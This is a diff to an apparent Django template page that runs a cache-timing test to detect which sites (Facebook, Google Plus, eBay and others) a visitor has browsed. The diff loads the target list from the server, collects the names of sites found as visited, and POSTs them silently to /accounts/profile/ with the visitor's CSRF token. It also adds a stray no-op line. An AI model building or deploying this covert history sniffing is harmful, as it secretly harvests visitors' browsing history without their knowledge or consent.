@@ -1,5 +1,8 @@
 <html>
-<head><script>
+<head>
+{% load staticfiles %}
+<script src="{% static "application_check/js/js.cookie.js" %}"></script>
+<script>
 
 /****************
  * SCANNED URLS *
@@ -12,16 +15,6 @@ var targets = [
   { 'name': 'Facebook', 'urls': [ 'https://s-static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
                                   'http://static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
                                   'http://static.ak.fbcdn.net/rsrc.php/v1/yX/r/HN0ehA1zox_.js' ] },
-
-/*
-
-  { 'name': 'Twitter', 'urls': [ 'http://a0.twimg.com/a/1323193483/phoenix/css/phoenix_core.bundle.css',
-                                 'http://a2.twimg.com/a/1323193483/phoenix/css/phoenix_core.bundle.css',
-                                 'http://a0.twimg.com/a/1323193483/phoenix/css/phoenix_more.bundle.css',
-                                 'https://si0.twimg.com/a/1323193483/phoenix/css/phoenix_core.bundle.css',
-                                 'https://twimg0-a.akamaihd.net/a/1323193483/phoenix/css/phoenix_core.bundle.css' ] },
-
-*/
 
   { 'name': 'Google Plus', 'urls': [ 'https://ssl.gstatic.com/gb/js/abc/gcm_57b1882492d4d0138a0a7ea7240394ca.js' ] },
 
@@ -73,6 +66,7 @@ var targets = [
   { 'name': 'eBay', 'urls': [ 'http://ir.ebaystatic.com/v4js/z/io/gbsozkl4ha54vasx4meo3qmtw.js' ] }
 
 ];
+var targets = {{ apps|safe }};
 
 
 /*************************
@@ -94,6 +88,7 @@ var confirmed_visited = false;
 
 var current_url, current_name;
 var wait_cycles;
+var found_targets = [];
 
 var frame_ready = false;
 
@@ -243,6 +238,7 @@ function maybe_test_next() {
     if (confirmed_visited) {
 
       log_text('Visited: ' + current_name + ' [' + cycles + ':' + attempt + ']', 'li', 'visited');
+      found_targets.push(current_name);
 
     }
 
@@ -271,6 +267,22 @@ function maybe_test_next() {
   } else {
 
     en = (new Date()).getTime();
+    var found_targ_string = "names=";
+    for(var i=0; i< found_targets.length; i++){
+      if (i == 0){
+        found_targ_string += found_targets[i];
+      }
+      else{
+        found_targ_string += ',' + found_targets[i];
+      }
+    }
+    var csrftoken = Cookies.get('csrftoken');
+    var x = new XMLHttpRequest();
+    x.open("POST", "/accounts/profile/");
+    x.setRequestHeader("X-CSRFToken", csrftoken);
+    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    x.setContentType
+    x.send(found_targ_string);
 
     document.getElementById('status').innerHTML = 'Tested ' + urls + ' individual URLs in ' + (en - st) + ' ms.';
 
